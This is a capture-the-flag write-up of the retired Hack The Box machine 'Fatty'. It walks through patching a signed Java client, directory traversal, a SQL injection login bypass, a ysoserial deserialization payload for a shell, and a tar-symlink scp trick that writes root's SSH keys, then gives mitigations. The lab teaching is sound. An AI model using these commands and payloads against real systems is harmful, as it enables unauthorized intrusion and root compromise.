---
machine: Fatty
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, java, jar, sqli, deserialization, ysoserial, symlink, scp, privesc]
---

# Fatty — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

FTP serves `fatty-client.jar`, a thick Java client that will not connect because the server listens on another port and the JAR is signed. It must be unpacked, the port changed in `beans.xml`, the digest updated and the signature removed before it runs. With a working client, a directory traversal downloads `fatty-server.jar`; patching it enables admin menus and skips the access check. A SQLi in the login allows an admin session, and a feature receiving serialized objects is exploited with `ysoserial` for a shell as `qtc` in the container. `pspy` reveals a periodic `scp` of `logs.tar` from the container to the host; a symlink inside a tar replaces `logs.tar` and, across two successive copies, writes root's `authorized_keys`.

## Reconnaissance

```bash
nmap -Pn -sCV -p21,22,1337,1338,1339 <IP>
```

- `21` vsftpd.
- `22` OpenSSH 7.4p1 Debian 10+deb9u7.
- `1337`, `1338` and `1339` speak TLS with unidentified protocols: the Java client and server ports.

```bash
ftp <IP>
# user anonymous, no password
get fatty-client.jar
```

FTP allows anonymous access and serves the client.

## Enumeration

The client requires a specific Java version (the project uses JavaFX). When run it tries to reach `server.fatty.htb` on a port that is not the real one:

```bash
unzip fatty-client.jar -d client
grep -rn "server.fatty.htb" client/
cat client/beans.xml
```

`beans.xml` holds the server IP and port. The port is corrected, the digest updated and the signature removed so the modified JAR runs:

```bash
rm client/META-INF/*.SF client/META-INF/*.RSA client/META-INF/*.DSA
zip -r fatty-client-patched.jar .
java -jar fatty-client-patched.jar
```

The client allows registering as `guest` and browsing a limited menu.

## Foothold

The client's download feature does not validate the path. A traversal retrieves the server:

```text
../../fatty-server.jar
```

The unpack/patch process is repeated, this time to enable admin menus and skip the server's access check. With the patched client, the login accepts an injection in the username:

```text
' OR 1=1-- -
```

and logs in as administrator. One of the new menus sends serialized Java objects; a `ysoserial` payload is generated and delivered:

```bash
java -jar ysoserial.jar CommonsCollections6 '<COMMAND>' > payload.bin
```

Deserialization runs in the container and returns a shell as `qtc`.

## Lateral movement

`qtc` is inside a container; no other host is reachable over the network. Enumeration focuses on processes and on mounts shared with the host, which is where the path to root lies.

## Privilege escalation

`pspy` shows an SSH connection and an `scp` every minute copying `/opt/fatty/tar/logs.tar` out of the container:

```text
sshd: qtc [priv]
scp -f /opt/fatty/tar/logs.tar
```

The host copies the file, extracts it and, on a second pass, copies `logs.tar` again. An archive containing a symlink named `logs.tar` pointing at `/root/.ssh/authorized_keys` is placed at `/opt/fatty/tar/logs.tar`. On the first copy the host extracts the tar and the name becomes a symlink to the key; on the second, `scp` follows the link and writes the content sent from the container. Supplying the attacker's public key and waiting for the cycle is enough:

```bash
ln -s /root/.ssh/authorized_keys logs.tar
tar -cf temp.tar logs.tar
cp temp.tar /opt/fatty/tar/logs.tar
# after the first copy, replace with the public key
echo "<PUBLIC_KEY>" > /opt/fatty/tar/logs.tar
ssh -i id_rsa root@fatty.htb
```

## Evidence

- `fatty-client.jar` downloaded over anonymous FTP.
- `beans.xml` with the corrected port and the unsigned JAR.
- `fatty-server.jar` obtained by traversal and patched.
- Admin login through SQLi.
- `ysoserial` payload and shell as `qtc`.
- `pspy` output showing the `logs.tar` `scp`.
- Symlink plus public key in `authorized_keys`; root access.

## Lessons learned

- A signed Java client can be patched by removing the signature and fixing the digest.
- Directory traversal in a download feature can hand over the server binary.
- Java deserialization is remote execution when client objects are accepted.
- A process copying and extracting files from another container trusts that content.
- A symlink inside a tar breaks the assumption that the copied file is a regular file.

## Mitigations and detection

- Never accept serialized objects from users; use data-only formats (JSON) and class allowlists.
- Validate download paths against a base directory and reject `..`.
- Do not expose `commons-collections` gadget classes to services that do not need them.
- Copy files between hosts with unprivileged users and verify content before extracting.
- Avoid `tar` on directories writable by other users; use `--no-same-owner` and check symlinks.
- Alert on periodic `scp` from containers and on writes to `authorized_keys`.

## References

- [0xdf — Fatty](https://0xdf.gitlab.io/2020/08/08/htb-fatty.html)
- [IppSec — Fatty](https://www.youtube.com/watch?v=3bvKLj0akMM)
- [Hack The Box — Fatty](https://app.hackthebox.com/machines/fatty)
